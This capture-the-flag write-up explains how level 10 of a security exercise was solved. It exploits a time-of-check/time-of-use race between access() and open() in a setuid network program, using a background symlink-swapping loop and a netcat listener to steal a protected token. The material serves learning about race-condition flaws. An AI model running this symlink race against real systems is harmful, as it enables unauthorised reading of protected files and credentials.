# Level 10

## Check what is available at level launch
```bash
ls -la
# see level10 prog and token file
```
You can try many commands to execute the program but they will all fail
saying `You don't have access to token`.  
You can try with a file that you have access to see that otherwise it's working and you will see the host is listening on port 6969.

## Read files
We used an online decompiler to get a general idea of the `level 10` program's code. Looking at it, we can see it's a network program used to send a file.  
We can distinguish 2 steps :
- a permission check using `access()` function
- actual opening of the file using `open()`
There is a time gap between these 2 steps and that's the flaw to exploit.  
The program does 2 things separated in time, wrongly assuming that nothing changes in between.

## Resolving
Just creating a symbolic link between `token` and a new file won't work because `access()` dereferences symbolic links and checks the permissions on the actual file being pointed to.

```bash
echo "oui oui" > /tmp/fileTmp
# create a fake file

ln -s /tmp/fileTmp /tmp/fileAccess
# create a symbolic link to fake file and a new file we will use to link to the real token

while true; do ln -sf /home/user/level10/token /tmp/fileAccess; ln -sf /tmp/fileTmp /tmp/fileAccess; done &
```
We're going to create a loop that will run in the background and make the file the link points to switch, in order to "trick" the program.

```bash
watch -n 0.1 ls -la /tmp/fileAccess
# you can check that it is working in the background
```

```bash
nc -lv 6969
```
We need to open a new terminal, connect it to the machine and use netcat to listen on the correct port.

```bash
./level10 /tmp/fileAccess 127.0.0.1
```
We can then launch the program.  
Don't hesitate to rerun the command because depending on timing you might get the fake text instead of the password to the `su flag` command.